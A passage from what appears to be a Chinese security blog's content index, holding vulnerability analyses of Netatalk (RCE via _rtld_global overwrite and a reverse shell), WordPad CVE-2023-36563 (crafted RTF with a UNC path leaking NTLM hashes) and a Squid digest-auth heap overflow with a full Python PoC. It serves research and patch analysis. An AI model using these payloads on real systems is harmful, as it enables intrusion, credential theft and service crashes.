(path=0x7efeac829bc0 \u0026lt;pathbuf\u0026gt; \u0026#34;._cmd\u0026#34;, ad=0x7ffd9f279540) at ad_open.c:617 #16 0x00007efeac7c5379 in ad_header_read_osx (path=0x7efeac829bc0 \u0026lt;pathbuf\u0026gt; \u0026#34;._cmd\u0026#34;, ad=0x55dcb6856780, hst=0x7ffd9f279bb0) at ad_open.c:713 #17 0x00007efeac7c7e50 in ad_open_rf_ea (path=0x55dcb5a7ef80 \u0026lt;upath\u0026gt; \u0026#34;cmd\u0026#34;, adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1488 #18 0x00007efeac7c80ae in ad_open_rf (path=0x55dcb5a7ef80 \u0026lt;upath\u0026gt; \u0026#34;cmd\u0026#34;, adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1529 #19 0x00007efeac7c8d29 in ad_open (ad=0x55dcb6856780, path=0x55dcb5a7ef80 \u0026lt;upath\u0026gt; \u0026#34;cmd\u0026#34;, adflags=0x283) at ad_open.c:1895 #20 0x000055dcb5a5a3bd in afp_openfork (obj=0x55dcb5a93920 \u0026lt;obj\u0026gt;, ibuf=0x7efeac2bf021 \u0026#34;Authent\u0026#34;, ibuflen=0x11, rbuf=0x55dcb6840b10 \u0026#34;\u0026#34;, rbuflen=0x55dcb6850b10) at fork.c:364 #21 0x000055dcb5a38c81 in afp_over_dsi (obj=0x55dcb5a93920 \u0026lt;obj\u0026gt;) at afp_dsi.c:627 #22 0x000055dcb5a5f3ff in dsi_start (obj=0x55dcb5a93920 \u0026lt;obj\u0026gt;, dsi=0x55dcb6840420, server_children=0x55dcb683d240) at main.c:474 #23 0x000055dcb5a5f102 in main (ac=0x4, av=0x7ffd9f27a1e8) at main.c:417 可以看到，程序试图调用位于0x4141414141414000处的函数\ngef➤ x /i $pc =\u0026gt; 0x7efeac84c59d \u0026lt;_dl_open+61\u0026gt;: call QWORD PTR [rip+0x199c5] # 0x7efeac865f68 \u0026lt;_rtld_global+3848\u0026gt; gef➤ x /gx 0x7efeac865f68 0x7efeac865f68 \u0026lt;_rtld_global+3848\u0026gt;: 0x4141414141414000 gef➤ 在\rhttps://code.woboq.org/userspace/glibc/elf/dl-open.c.html 可以看到_dl_open函数源码，该处为_dl_open函数试图通过函数指针调用__rtld_lock_lock_recursive指向的函数并把_dl_load_lock地址作为指针参数传入该函数内。\nvoid * _dl_open (const char *file, int mode, const void *caller_dlopen, Lmid_t nsid, int argc, char *argv[], char *env[]) { if ((mode \u0026amp; RTLD_BINDING_MASK) == 0) /* One of the flags must be set. */ _dl_signal_error (EINVAL, file, NULL, N_(\u0026#34;invalid mode for dlopen()\u0026#34;)); /* Make sure we are alone. */ __rtld_lock_lock_recursive (GL(dl_load_lock)); _rtld_global地址为0x7efeac865060\ngef➤ p \u0026amp;_rtld_global $4 = (struct rtld_global *) 0x7efeac865060 \u0026lt;_rtld_global\u0026gt; __rtld_lock_lock_recursive 函数指针及参数dl_load_lock均为全局变量_rtld_global的成员\n# define GL(name) _rtld_local._##name # else # define GL(name) _rtld_global._##name 定义在_rtld_local=_rtld_global 初始化过的全局变量存放在.data段，在ld.so中.data段的偏移为0x2e060。\n此时可以利用任意写将获取到的system函数地址覆盖到__rtld_lock_lock_recursive 内，并且将要执行的命令放入_dl_load_lock 即可造成命令执行。\n命令执行\n此前说过任意写是将map + ad.ADEID_RFORK.off 处长为ad.ADEID_RFORK.len的数据写入到map + ad.ADEID_FINDERI.off + 0x20 内，而在分配大小小于0x1000情况下，mmap函数分配的内存刚好在data段上面，此时mmap分配的内存地址距离要覆盖的_dl_load_lock 参数为0x2968，以此可得ad.ADEID_FINDERI.off=0x2940\n$7 = (__rtld_lock_recursive_t *) 0x7efeac865968 \u0026lt;_rtld_global+2312\u0026gt; gef➤ p \u0026amp;_rtld_global._dl_load_lock Quit gef➤ p 0x7efeac865968 - 0x7efeac863000 $8 = 0x2968 同时还要覆盖到__rtld_lock_lock_recursive 函数指针，测算可得至少需要复制0x600的长度才能覆盖到函数指针，此处可以设置复制长度为0x620\ngef➤ p \u0026amp;_rtld_global._dl_rtld_lock_recursive $10 = (void (**)(void *)) 0x7efeac865f68 \u0026lt;_rtld_global+3848\u0026gt; gef➤ p 0x7efeac865f68 - 0x7efeac863000 $11 = 0x2f68 gef➤ p 0x2f68 - 0x2968 $12 = 0x600 利用上述偏移，加上计算得到的system函数地址，生成可用文件，如下：\n此时在目标主机内已有了该定时任务，在攻击机上监听2333端口即可收到反弹的shell\n补丁分析 在Netatalk3.1.13版本中修复了该漏洞，在新版本中，先检查if中的条件而后给ad指向的结构体赋值，如果if中条件为真，也就是可能发生了越界则直接打印错误消息而后return -1，只有if条件不满足才继续赋值，从而防止了adouble结构体含有不正确的偏移，在外层函数获取到的偏移在范围内从而修复了该漏洞。\n函数解释 **void** *memmove (**void** *__dest, **const** **void** *__src, size_t __n) // dest指向要复制的目标内存，src指向要复制的数据内存，n为要复制的大小（字节） // 如果dest和src指向的内存重叠，该函数仍然可以正常处理，逻辑如下 char str[] = \u0026#34;memmove can be very useful......\u0026#34;; memmove (str+20,str+15,11); // 输出为 memmove can be very very useful. 参考链接 https://code.woboq.org/userspace/glibc/elf/dl-open.c.html#_dl_open\nhttps://nosec.org/home/detail/4997.html\nhttps://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/\nCreated at 2023-11-23T10:46:28+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/","title":"CVE-2023-36563 Wordpad Info Disclosure 分析","tags":["漏洞分析"],"description":"","content":"基本信息 wordpad在解析rtf文件包含的ole对象时会尝试访问Linked object的Topic指向的文件，如果Topic是一个UNC路径则会尝试通过网络访问，并尝试使用NTLM认证，导致泄露NTLM hash。\n影响版本 略\n环境搭建 windows 10 21h2 2023-09补丁 技术分析\u0026amp;调试 初次看这个漏洞，直觉上很类似今年4月份的在野利用漏洞\rCVE-2023-23397 outlook 权限提升漏洞，都是泄露NTLM hash，该漏洞也可能是在某种文件的某个属性使用了UNC路径，使得wordpad加载远程资源，造成NTLM hash泄露。\n补丁diff\ndiff wordpad.exe，可以看到修改了如下函数 同时在修复后的wordpad.exe中新增了QueryConvertOLELinkCallback函数和_LoadImageWithWIC_0，根据微软的函数命名规则，QueryConvertOLELinkCallback可能用于查询并转换OLE链接回调函数，比较符合我们的猜测。 附上AI解释 对比各个修改后的函数，可以看出LoadImageResource为加载Image的资源节里面的资源，不是很符合我们之前的假设 回到补丁新增的函数中，对于新增的函数QueryConvertOLELineCallback，其在CRichEdit2View::OnCreate函数中调用，在diff中可以看到补丁中将该函数作为回调函数指针传递给了SendMessageW，目标窗口可以取出这个回调函数指针并调用\n分析到这可以猜测是wordpad打开OLE对象时，将某个属性作为UNC路径进行了解析并访问，导致NTLM hash泄露。 ole对象相关功能由ole32.dll实现，diff ole32.dll，主要修改了如下函数\nOLESTREAMToGenericObject wConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorageEx 新增了如下函数\nIsAppExcludedFromOLELinkConversionRegistrySetting CheckOLELinkConversionRegistrySetting FindStringInMultiString OleConvertOLESTREAMToIStorage2 OleConvertOLESTREAMToIStorageEx2 在OLESTREAMToGenericObject函数diff中可以看到调用了wordpad中传递的函数指针QueryConvertOLELineCallback，并使用PrependUNCName将szUNC添加UNC路径后赋给a2-\u0026gt;m_szTopic。 因此可以得出结论：该漏洞是将ole对象的m_szTopic作为UNC路径进行访问。\n谷歌搜索OLESTREAMToGenericObject，在其他安全研究员发表的\r其他ole漏洞分析中看到了如下\nOLE格式可以在\rOLD微软官方文档中看到，FormatID标识了ole对象类型，根据之前的分析可以知道是LinkedObject导致了该漏洞的产生。 根据\r微软文档，LinkedObject是单独的源文件中的对象。如果源文件中的对象发生更改，则文档中的对象将自动更新以反映这些更改。\nlinked object: An object that is inserted into a document and continues to exist in a separate source file. If the object in the source file changes, the object in the document is updated automatically to reflect those changes.\n通过wordpad创建一个rtf文件并嵌入ole对象，使用编辑器打开可以看到如下，根据文档可知该ole对象类型为EmbedObject\n{\\rtf1\\ansi\\ansicpg54936\\deff0\\nouicompat\\deflang1033\\deflangfe2052{\\fonttbl{\\f0\\fnil\\fcharset134 \\\u0026#39;cb\\\u0026#39;ce\\\u0026#39;cc\\\u0026#39;e5;}} {\\*\\generator Riched20 10.0.19041}\\viewkind4\\uc1 \\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang2052 fff{\\object\\objemb{\\*\\objclass PBrush}\\objw2835\\objh2835{\\*\\objdata 01050000 02000000 07000000 50427275736800 00000000 00000000 a0a30100 424d8ea30100000000003600000028000000bd000000bd000000010018000000000058a3010000 000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 下载\role tools，查看wordpad生成的rtf文件信息\n➜ rtfobj.exe .\\test.rtf rtfobj 0.60.1 on Python 3.9.6 - http://decalage.info/python/oletools THIS IS WORK IN PROGRESS - Check updates regularly! Please report any issue at https://github.com/decalage2/oletools/issues =============================================================================== File: \u0026#39;.\\\\test.rtf\u0026#39; - size: 661865 bytes ---+----------+--------------------------------------------------------------- id |index |OLE Object ---+----------+--------------------------------------------------------------- 0 |00000118h |format_id: 2 (Embedded) | |class name: b\u0026#39;PBrush\u0026#39; | |data size: 107424 | |MD5 = \u0026#39;6eb1e875d3759af5e4b65cd324182471\u0026#39; ---+----------+--------------------------------------------------------------- 我们知道Topic属性是触发漏洞的关键，通过查看ole文档找到了关键信息，如果LinkedObject包含了ObjectHeader结构，则TopicName必须包含指向链接的文件路径，这个路径必须是绝对路径或者是UNC路径 所以我们可以将UNC路径设置为我们的恶意服务器，重新构造rtf文件，成功触发\n{\\rtf1\\ansi\\ansicpg54936\\deff0\\nouicompat\\deflang1033\\deflangfe2052{\\fonttbl{\\f0\\fnil\\fcharset134 \\\u0026#39;cb\\\u0026#39;ce\\\u0026#39;cc\\\u0026#39;e5;}} {\\*\\generator Riched20 10.0.19041}{\\*\\mmathPr\\mdispDef1\\mwrapIndent1440 }\\viewkind4\\uc1 \\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang2052{\\object\\objemb{\\*\\objclass Word.Document.8}\\objw585\\objh795{\\*\\objdata 01050000 01000000 10000000 576f72642e446f63756d656e742e3800 17000000 5c5c3139322e3136382e35322e3135365c312e72746600 00000000 00000000 00000000 00000000 01050000 05000000 10000000 576f72642e446f63756d656e742e3800 0e000000 74400000 0100090000033a20000009001610000000001610000026060f002220574d464301000000000001 注意到即使设置了MotW，虽然wordpad会显示警告，但仍然会访问Topic指向的资源，在procmonitor中可以看到如下事件 补丁和缓解措施分析\n微软在补丁日后发布了\r一篇文章，指出可以在 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole\\AppCompat\\OLELinkConversionFromOLESTREAMToIStorage中添加DWORD的Disabled值0x00000001来禁用，但我在win 10 21h2 9月补丁中应用了此方法，但不起作用，wordpad没有读取这个注册表。打开文件后仍然访问了UNC路径，泄露了NTLM hash\n在前文补丁分析中已知，wordpad会传递回调函数给ole32一个回调函数，在ole32中，会先检查注册表是否禁用了ole对象链接转换，而后检查当前进程是否在白名单内，最后而后调用用户提供的回调函数，以运行用户自定义的规则。\nPoC构造\n打开wordpad，插入一个rtf对象，而后将Topic的长度和name字段替换为UNC路径即可，稍晚俩天poc会公布在我的GitHub\nhttps://github.com/Chestnuts4/POC 小结 这个漏洞和预想中一样，是由于某个属性可以被设置为UNC路径，而后wordpad会访问这个UNC路径，虽然文件设置了MotW标识，wordpad显示了警告，但反常的是wordpad仍然在用户没有同意的情况下访问了目标UNC路径，这一点比较反直觉。\n参考链接\nhttps://securityonline.info/poc-released-for-microsoft-wordpad-cve-2023-36563-flaw-exploited-in-attacks/\nhttps://www.dillonfrankesecurity.com/posts/cve-2023-36563-wordpad-analysis/\nCreated at 2023-10-31T17:12:19+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/","title":"Squid 拒绝服务漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 开启了digest身份认证的squid代理服务器存在堆溢出漏洞，未经身份验证的攻击者可以利用该漏洞造成拒绝服务。\n指纹 hunter\nweb.title=\u0026#34;ERROR The requested URL could not be retrieved\u0026#34; 影响版本 squid\n3.2.0.1-5.9, 6.0-6.3 环境搭建 按照configure脚本的提示安装各个依赖，而后执行如下：\nexport C_INCLUDE_PATH=/usr/include/libxml2 export CPLUS_INCLUDE_PATH=/usr/include/libxml2 ./configure \u0026#39;--build=x86_64-linux-gnu\u0026#39; \u0026#39;--prefix=/root/squid/squid-6.3/build\u0026#39; \u0026#39;--includedir=${prefix}/include\u0026#39; \u0026#39;--mandir=${prefix}/share/man\u0026#39; \u0026#39;--infodir=${prefix}/share/info\u0026#39; \u0026#39;--sysconfdir=/etc\u0026#39; \u0026#39;--localstatedir=/var\u0026#39; \u0026#39;--disable-option-checking\u0026#39; \u0026#39;--disable-silent-rules\u0026#39; \u0026#39;--libdir=${prefix}/lib/x86_64-linux-gnu\u0026#39; \u0026#39;--runstatedir=/run\u0026#39; \u0026#39;--disable-maintainer-mode\u0026#39; \u0026#39;--disable-dependency-tracking\u0026#39; \u0026#39;BUILDCXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations -Wdate-time -D_FORTIFY_SOURCE=2 -Wl,-z,relro -Wl,-z,now \u0026#39; \u0026#39;BUILDCXX=g++\u0026#39; \u0026#39;--with-build-environment=default\u0026#39; \u0026#39;--enable-build-info=Debian linux\u0026#39; \u0026#39;--datadir=/usr/share/squid\u0026#39; \u0026#39;--sysconfdir=/etc/squid\u0026#39; \u0026#39;--libexecdir=/usr/lib/squid\u0026#39; \u0026#39;--mandir=/usr/share/man\u0026#39; \u0026#39;--enable-inline\u0026#39; \u0026#39;--disable-arch-native\u0026#39; \u0026#39;--enable-async-io=8\u0026#39; \u0026#39;--enable-storeio=ufs,aufs,diskd,rock\u0026#39; \u0026#39;--enable-removal-policies=lru,heap\u0026#39; \u0026#39;--enable-delay-pools\u0026#39; \u0026#39;--enable-icap-client\u0026#39; \u0026#39;--enable-follow-x-forwarded-for\u0026#39; \u0026#39;--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,PAM,POP3,RADIUS,SASL,SMB\u0026#39; \u0026#39;--enable-auth-digest=file,LDAP\u0026#39; \u0026#39;--enable-auth-negotiate=wrapper\u0026#39; \u0026#39;--enable-auth-ntlm=fake,SMB_LM\u0026#39; \u0026#39;--enable-external-acl-helpers=file_userip,LDAP_group,SQL_session,unix_group,wbinfo_group\u0026#39; \u0026#39;--enable-security-cert-validators=fake\u0026#39; \u0026#39;--enable-storeid-rewrite-helpers=file\u0026#39; \u0026#39;--enable-url-rewrite-helpers=fake\u0026#39; \u0026#39;--enable-eui\u0026#39; \u0026#39;--enable-esi\u0026#39; \u0026#39;--enable-zph-qos\u0026#39; \u0026#39;--disable-translation\u0026#39; \u0026#39;--with-swapdir=/var/spool/squid\u0026#39; \u0026#39;--with-logdir=/var/log/squid\u0026#39; \u0026#39;--with-pidfile=/run/squid.pid\u0026#39; \u0026#39;--with-filedescriptors=65536\u0026#39; \u0026#39;--with-large-files\u0026#39; \u0026#39;--with-default-user=proxy\u0026#39; \u0026#39;--enable-linux-netfilter\u0026#39; \u0026#39;--without-systemd\u0026#39; \u0026#39;--with-gnutls\u0026#39; \u0026#39;build_alias=x86_64-linux-gnu\u0026#39; \u0026#39;CFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations\u0026#39; \u0026#39;LDFLAGS=-Wl,-z,relro -Wl,-z,now \u0026#39; \u0026#39;CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2\u0026#39; \u0026#39;CXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations\u0026#39; \u0026#39;--disable-optimizations\u0026#39; 配置在squid.conf添加如下\nauth_param digest program /usr/lib/squid/digest_file_auth -c /etc/squid/password.digest auth_param digest realm localhost acl authenticated proxy_auth REQUIRED http_access allow authenticated http_port 3128 test:localhost:39df1982ed1fef9f74ecd670a2a93c66 使用如下请求触发\ncurl -i -k http://116.62.202.230 -x 192.168.59.197:3128 -U test:123456 --proxy-digest 技术分析\u0026amp;调试 补丁分析\n补丁修复于src\\auth\\digest\\Config.cc，可以看出补丁主要是对value.size进行了判断，在修复前虽然判断了value.size()是否为8，但仅仅打印了一条调试信息，后面仍然调用xstrncpy进行复制。 在补丁处如果nc参数不是8则不会调用xstrncpy进行复制。 而xstrncpy要写入的长度参数来源于value.size()，value是一个String类型变量\ncase DIGEST_NC: if (value.size() != 8) { debugs(29, 9, \u0026#34;Invalid nc \u0026#39;\u0026#34; \u0026lt;\u0026lt; value \u0026lt;\u0026lt; \u0026#34;\u0026#39; in \u0026#39;\u0026#34; \u0026lt;\u0026lt; temp \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34;); } xstrncpy(digest_request-\u0026gt;nc, value.rawBuf(), value.size() + 1); debugs(29, 9, \u0026#34;Found noncecount \u0026#39;\u0026#34; \u0026lt;\u0026lt; digest_request-\u0026gt;nc \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34;); break; char * xstrncpy(char *dst, const char *src, size_t n) { char *r = dst; if (!n || !dst) return dst; if (src) while (--n != 0 \u0026amp;\u0026amp; *src != \u0026#39;\\0\u0026#39;) { *dst = *src; ++dst; ++src; } *dst = \u0026#39;\\0\u0026#39;; return r; } 可以看出这是一个越界写漏洞，可以造成堆溢出。 动态调试\n断点如下\ngef➤ b Auth::Digest::Config::decode gef➤ b Config.cc:829 通过curl触发断点\ncurl -i -k http://host -x 192.168.59.197:3128 -U test:123456 --proxy-digest 此时调用栈如下\ngef➤ bt #0 Auth::Digest::Config::decode (this=0x55a2e598a470, proxy_auth=0x55a2e5cc50e7 \u0026#34;username=\\\u0026#34;test\\\u0026#34;,realm=\\\u0026#34;localhost\\\u0026#34;,nonce=\\\u0026#34;52a18c55ec2a173b665ae8c4d1b947b6\\\u0026#34;,uri=\\\u0026#34;/\\\u0026#34;,cnonce=\\\u0026#34;b315dc470396be779b18a73909a139f1\\\u0026#34;,nc=00000001,response=\\\u0026#34;edda2d0982c717bd74ad9989da11b158\\\u0026#34;,qop=\\\u0026#34;auth\\\u0026#34;\u0026#34;, request=0x55a2e61210e0, aRequestRealm=0x0) at Config.cc:830 #1 0x000055a2e483a895 in Auth::SchemeConfig::CreateAuthUser ( proxy_auth=0x55a2e5cc50e0 \u0026#34;Digest username=\\\u0026#34;test\\\u0026#34;,realm=\\\u0026#34;localhost\\\u0026#34;,nonce=\\\u0026#34;52a18c55ec2a173b665ae8c4d1b947b6\\\u0026#34;,uri=\\\u0026#34;/\\\u0026#34;,cnonce=\\\u0026#34;b315dc470396be779b18a73909a139f1\\\u0026#34;,nc=00000001,response=\\\u0026#34;edda2d0982c717bd74ad9989da11b158\\\u0026#34;,qop=\\\u0026#34;auth\\\u0026#34;\u0026#34;, al=...) at SchemeConfig.cc:55 #2 0x000055a2e4840d94 in Auth::UserRequest::authenticate (auth_user_request=0x55a2e611ee20, headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:354 #3 0x000055a2e4841952 in Auth::UserRequest::tryToAuthenticateAndSetAuthUser (aUR=0x55a2e611ee20, headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:453 #4 0x000055a2e4807766 in AuthenticateAcl (ch=0x55a2e611ec88) at Acl.cc:57 #5 0x000055a2e4809a2d in ACLProxyAuth::match (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at AclProxyAuth.cc:55 #6 0x000055a2e4861813 in ACL::matches (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at Acl.cc:171 #7 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598bc50, pos=0x55a2e598ac40, child=0x55a2e598ac40) at Checklist.cc:93 #8 0x000055a2e4866018 in Acl::AndNode::doMatch (this=0x55a2e598bc50, checklist=0x55a2e611ec88, start=0x55a2e598ac40) at BoolOps.cc:76 #9 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at InnerNode.cc:91 #10 0x000055a2e4861813 in ACL::matches (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at Acl.cc:171 #11 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598c098, pos=0x55a2e598bc50, child=0x55a2e598bc50) at Checklist.cc:93 #12 0x000055a2e4866198 in Acl::OrNode::doMatch (this=0x55a2e598c098, checklist=0x55a2e611ec88, start=0x55a2e598bc50) at BoolOps.cc:114 #13 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598c098, checklist=0x55a2e611ec88) at InnerNode.cc:91 #14 0x000055a2e4861813 in ACL::matches (this=0x55a2e598c098, checklist=0x55a2e611ec88) at Acl.cc:171 #15 0x000055a2e4867883 in ACLChecklist::matchAndFinish (this=0x55a2e611ec88) at Checklist.cc:295 #16 0x000055a2e4867691 in ACLChecklist::nonBlockingCheck (this=0x55a2e611ec88, callback_=0x55a2e4749b13 \u0026lt;clientAccessCheckDoneWrapper(Acl::Answer, void*)\u0026gt;, callback_data_=0x55a2e611e8b8) at Checklist.cc:254 #17 0x000055a2e47498dc in ClientRequestContext::clientAccessCheck (this=0x55a2e611e8b8) at client_side_request.cc:660 #18 0x000055a2e474da2d in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1704 #19 0x000055a2e4748ec8 in ClientRequestContext::hostHeaderVerify (this=0x55a2e611e8b8) at client_side_request.cc:608 #20 0x000055a2e474d8ff in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1697 #21 0x000055a2e4727ff3 in clientProcessRequest (conn=0x55a2e6118e78, hp=..., context=0x55a2e611a740) at client_side.cc:1759 #22 0x000055a2e48b338e in Http::One::Server::processParsedRequest (this=0x55a2e6118e78, context=...) at Http1Server.cc:284 #23 0x000055a2e4729260 in ConnStateData::clientParseRequests (this=0x55a2e6118e78) at client_side.cc:1948 #24 0x000055a2e472961a in ConnStateData::afterClientRead (this=0x55a2e6118e78) at client_side.cc:1982 #25 0x000055a2e48b701c in Server::doClientRead (this=0x55a2e6118e78, io=...) at Server.cc:183 #26 0x000055a2e48b8250 in CommCbMemFunT\u0026lt;Server, CommIoCbParams\u0026gt;::doDial (this=0x55a2e6117458) at ../../src/CommCalls.h:190 #27 0x000055a2e48b832b in JobDialer\u0026lt;Server\u0026gt;::dial (this=0x55a2e6117458, call=...) at ../../src/base/AsyncJobCalls.h:175 #28 0x000055a2e48b8137 in AsyncCallT\u0026lt;CommCbMemFunT\u0026lt;Server, CommIoCbParams\u0026gt; \u0026gt;::fire (this=0x55a2e6117420) at ../../src/base/AsyncCall.h:147 #29 0x000055a2e48d2d3c in AsyncCall::make (this=0x55a2e6117420) at AsyncCall.cc:44 #30 0x000055a2e48d3e50 in AsyncCallQueue::fire (this=0x55a2e5ca15d0) at AsyncCallQueue.cc:27 #31 0x000055a2e4669475 in EventLoop::dispatchCalls (this=0x7ffd91608f90) at EventLoop.cc:144 #32 0x000055a2e4669381 in EventLoop::runOnce (this=0x7ffd91608f90) at EventLoop.cc:121 #33 0x000055a2e46691d4 in EventLoop::run (this=0x7ffd91608f90) at EventLoop.cc:83 #34 0x000055a2e47a0842 in SquidMain (argc=0x3, argv=0x7ffd916091a8) at main.cc:1661 #35 0x000055a2e479fa03 in SquidMainSafe (argc=0x3, argv=0x7ffd916091a8) at main.cc:1353 #36 0x000055a2e479f9bd in main (argc=0x3, argv=0x7ffd916091a8) at main.cc:1341 在gdb中可以看到value值为传入的请求的nc的值\ngef➤ p value $1 = { static npos = 0xffffffffffffffff, size_ = 0x28, len_ = 0x8, static SizeMax_ = 0xffff, buf_ = 0x55a2e6125a60 \u0026#34;00000001\u0026#34; } 长度为nc的长度，此时只需要nc长度超过目标缓冲区 digest_request-\u0026gt;nc即可造成堆溢出。查看 digest_request定义可知nc大小为9\nclass UserRequest : public Auth::UserRequest { MEMPROXY_CLASS(Auth::Digest::UserRequest); public: UserRequest(); ~UserRequest() override; int authenticated() const override; void authenticate(HttpRequest * request, ConnStateData * conn, Http::HdrType type) override; Direction module_direction() override; void addAuthenticationInfoHeader(HttpReply * rep, int accel) override; #if WAITING_FOR_TE virtual void addAuthenticationInfoTrailer(HttpReply * rep, int accel); #endif void startHelperLookup(HttpRequest *request, AccessLogEntry::Pointer \u0026amp;al, AUTHCB *, void *) override; const char *credentialsStr() override; char *noncehex; /* \u0026#34;dcd98b7102dd2f0e8b11d0f600bfb0c093\u0026#34; */ char *cnonce; /* \u0026#34;0a4f113b\u0026#34; */ char *realm; /* = \u0026#34;testrealm@host.com\u0026#34; */ char *pszPass; /* = \u0026#34;Circle Of Life\u0026#34; */ char *algorithm; /* = \u0026#34;md5\u0026#34; */ char nc[9]; /* = \u0026#34;00000001\u0026#34; */ char *pszMethod; /* = \u0026#34;GET\u0026#34; */ char *qop; /* = \u0026#34;auth\u0026#34; */ char *uri; /* = \u0026#34;/dir/index.html\u0026#34; */ char *response; digest_request为Auth::Digest::UserRequest指针，使用new分配内存，位于堆内\nPoC构造\n漏洞代码对应于处理[[../06 Protocol/HTTP digest身份认证|HTTP digest 认证]]，通过该认证请求需要发送两次请求，第一次不携带认证头，此时squid会返回407，需要提取响应中的nonce，简单的使用python即可构造 PoC\nimport requests from requests.auth import HTTPDigestAuth import random import string import hashlib proxies={ \u0026#39;http\u0026#39;:\u0026#39;http://192.168.59.197:3128\u0026#39;, \u0026#39;https\u0026#39;:\u0026#39;http://192.168.59.197:3128\u0026#39; } resp_407=\u0026#34;\u0026#34;\u0026#34; Digest realm=\u0026#34;localhost\u0026#34;, nonce=\u0026#34;47e5f5dc8b7237cf1153065afe358c89\u0026#34;, qop=\u0026#34;auth\u0026#34;, stale=false\u0026#34;\u0026#34;\u0026#34; rr=\u0026#39;\u0026#39;\u0026#39;Digest username=\u0026#34;test\u0026#34;,realm=\u0026#34;localhost\u0026#34;,nonce=\u0026#34;47e5f5dc8b7237cf1153065afe358c89\u0026#34;,uri=\u0026#34;/\u0026#34;,cnonce=\u0026#34;a0824a23a0394203c3023085915fd744\u0026#34;,nc=00000001,response=\u0026#34;b45560b922d64786ef7d6c96c9071dfa\u0026#34;,qop=\u0026#34;auth\u0026#34;\u0026#39;\u0026#39;\u0026#39; data=\u0026#39;\u0026#39;\u0026#39;Digest username=\u0026#34;{username}\u0026#34;,realm=\u0026#34;{realm}\u0026#34;,nonce=\u0026#34;{nonce}\u0026#34;,uri=\u0026#34;{uri}\u0026#34;,cnonce=\u0026#34;{cnonce}\u0026#34;,nc={nc},response=\u0026#34;{response}\u0026#34;,qop=\u0026#34;auth\u0026#34;\u0026#39;\u0026#39;\u0026#39; username=\u0026#34;test\u0026#34; password=\u0026#34;123456\u0026#34; realm=\u0026#34;localhost\u0026#34; nc=\u0026#34;00000001\u0026#34;*100 cnonce = \u0026#39;\u0026#39;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(32)) ha1 = hashlib.md5((username + \u0026#39;:\u0026#39; + realm + \u0026#39;:\u0026#39; + password).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() ha2= hashlib.md5(\u0026#34;GET:/\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)).hexdigest() resp =requests.get(url=\u0026#34;http://116.62.202.230\u0026#34;,proxies=proxies,verify=False) if resp.status_code==407: resp_header = resp.headers nonce = resp_header[\u0026#34;Proxy-Authenticate\u0026#34;].split(\u0026#39;,\u0026#39;)[1].split(\u0026#39;=\u0026#39;)[1].rstrip(\u0026#39;\u0026#34;\u0026#39;).lstrip(\u0026#39;\u0026#34;\u0026#39;) response = hashlib.md5((ha1+\u0026#34;:\u0026#34;+nonce+\u0026#34;:\u0026#34;+nc+\u0026#34;:\u0026#34;+cnonce+\u0026#34;:auth:\u0026#34;+ha2).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() print(\u0026#34;nonce: {}\\tcnonce: {}\\tresponse: {}\u0026#34;.format(nonce,cnonce,response)) rdata = data.format(username=username,realm=realm,nonce=nonce,uri=\u0026#34;/\u0026#34;,cnonce=cnonce,nc=nc,response=response) header = { \u0026#34;Proxy-Authorization\u0026#34;: rdata } print(rdata) resp =requests.get(url=\u0026#34;http://116.62.202.230\u0026#34;,proxies=proxies,verify=False,headers=header) print(resp.status_code,resp.text) 小结 